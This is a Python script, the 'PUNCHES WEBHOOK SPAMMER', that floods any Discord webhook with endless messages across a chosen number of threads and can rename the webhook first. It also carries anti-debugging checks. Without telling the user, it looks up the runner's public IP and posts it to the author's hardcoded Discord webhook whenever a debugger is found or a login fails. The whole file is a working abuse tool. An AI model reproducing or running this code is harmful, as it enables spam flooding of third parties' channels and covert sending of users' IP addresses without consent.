import time
import requests
import pyfiglet
import threading
import hashlib
import sys
import os
import traceback

print(pyfiglet.figlet_format("PUNCHES WEBHOOK SPAMMER"))

def hash_password(password: str) -> str:
    """Hashes the password using SHA-256."""
    return hashlib.sha256(password.encode()).hexdigest()

def verify_password(input_password: str, stored_hash: str) -> bool:
    """Verifies if the entered password matches the stored hash."""
    return hash_password(input_password) == stored_hash

def get_public_ip():
    """Retrieves the user's public IP address."""
    try:
        response = requests.get("https://api64.ipify.org?format=json")
        return response.json().get("ip", "Unknown IP")
    except Exception as e:
        print(f"Failed to retrieve IP: {e}")
        return "Unknown IP"

def report_invalid_attempt(reason, username=None, ip=None):
    """Reports an invalid attempt (username or password) and logs the IP."""
    report_webhook = "https://discord.com/api/webhooks/1306091394951020555/yMaZZQx4bXJvO-I703S79wseiwjj_NaXhrPXT08Cc1_lRCCNLuXEYzAMfbS2epMfxf5Y"
    try:
        content = f"Unauthorized attempt - Reason: {reason}"
        if username:
            content += f" | Username: {username}"
        if ip:
            content += f" | IP: {ip}"
        requests.post(report_webhook, json={"content": content})
        print("Unauthorized attempt reported.")
        
        # Append the IP to a blacklist file
        if ip:
            with open("blacklist.txt", "a") as file:
                file.write(f"{ip}\n")
    except Exception as e:
        print(f"Failed to report unauthorized attempt. Error: {e}")

def change_webhook_name(webhook, new_name):
    """Changes the webhook's name before spamming."""
    try:
        response = requests.patch(webhook, json={"name": new_name})
        if response.status_code == 200:
            print(f"Webhook name changed to: {new_name}")
        else:
            print(f"Failed to change webhook name. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error changing webhook name: {e}")

def spam(webhook, msg, sleep_time, username):
    """Function to send spam messages."""
    while True:
        try:
            data = requests.post(webhook, json={'content': f"{username}: {msg}"})
            if data.status_code == 204:
                print(f"{username} sent MSG: {msg}")
            else:
                print(f"Failed to send message. Status code: {data.status_code}")
        except Exception as e:
            print(f"Bad Webhook: {webhook} | Error: {e}")
        time.sleep(sleep_time)

# Anti-Debugging Functions
def check_for_debugger():
    """Check if the script is being run in a debugger."""
    
    # 1. Check if there's a trace function (which is typically used by debuggers)
    if sys.gettrace() is not None:
        print("Debugger detected!")
        return True
    
    # 2. Check for presence of 'pdb' (Python Debugger)
    if "pdb" in sys.modules:
        print("Debugger (pdb) detected!")
        return True
    
    # 3. Check if a debugger is attached by looking for common debugger artifacts
    if os.getenv("PYTHONBREAKPOINT"):
        print("Debugger breakpoint detected!")
        return True
    
    # 4. Check stack depth for unusual debugger behavior
    try:
        if len(traceback.extract_stack()) > 30:  # Adjust this threshold as needed
            print("Possible debugger detected due to stack depth!")
            return True
    except Exception as e:
        print(f"Error in stack depth check: {e}")
    
    return False

def anti_debugging_timer():
    """Detect abnormal delays caused by stepping through code in a debugger."""
    start_time = time.time()
    
    # Simulate some normal code execution
    time.sleep(0.5)
    
    end_time = time.time()
    elapsed_time = end_time - start_time
    
    if elapsed_time > 1.0:  # If it took too long, a debugger might be stepping through
        print(f"Debugger detected via timing check! Elapsed time: {elapsed_time}")
        return True
    
    return False

def prevent_debugger(ip):
    """Main anti-debugging function."""
    if check_for_debugger():
        print("Debugger detected! Terminating the script.")
        # Report the IP address if a debugger is detected
        report_invalid_attempt("Debugger detected", ip=ip)
        sys.exit(1)
    
    if anti_debugging_timer():
        print("Debugger detected! Terminating the script.")
        # Report the IP address if a debugger is detected
        report_invalid_attempt("Debugger detected via timing check", ip=ip)
        sys.exit(1)

def main():
    # Get the user's IP address
    ip = get_public_ip()
    
    # Prevent debugging before running the main logic
    prevent_debugger(ip)

    stored_hash = hash_password("yypunch owns you")  # Securely store the hash
    user_input = input("Enter the password: ")

    if not verify_password(user_input, stored_hash):
        print("You're not authorized to use this tool.")
        report_invalid_attempt("Incorrect password", ip=ip)
        return

    username = input("Enter your username: ")
    allowed_usernames = ["admin", "punch"]  # Add valid usernames here
    
    if username not in allowed_usernames:
        print("Invalid username! Reporting...")
        report_invalid_attempt("Invalid username", username=username, ip=ip)
        return

    webhook = input("Please Insert WebHook URL: ")
    rename_choice = input("Do you want to rename the webhook? (y/n): ").strip().lower()
    
    if rename_choice == 'y':
        new_name = input("Enter new webhook name: ")
        change_webhook_name(webhook, new_name)
    
    msg = input("Please Insert Message: ")
    
    try:
        th = int(input('Number of threads? (200 recommended): '))
        sleep_time = int(input("Sleeping time? (recommended 2): "))
    except ValueError:
        print("Invalid input. Please enter numbers for thread count and sleep time.")
        return

    for _ in range(th):
        t = threading.Thread(target=spam, args=(webhook, msg, sleep_time, username))
        t.start()

if __name__ == "__main__":
    main()
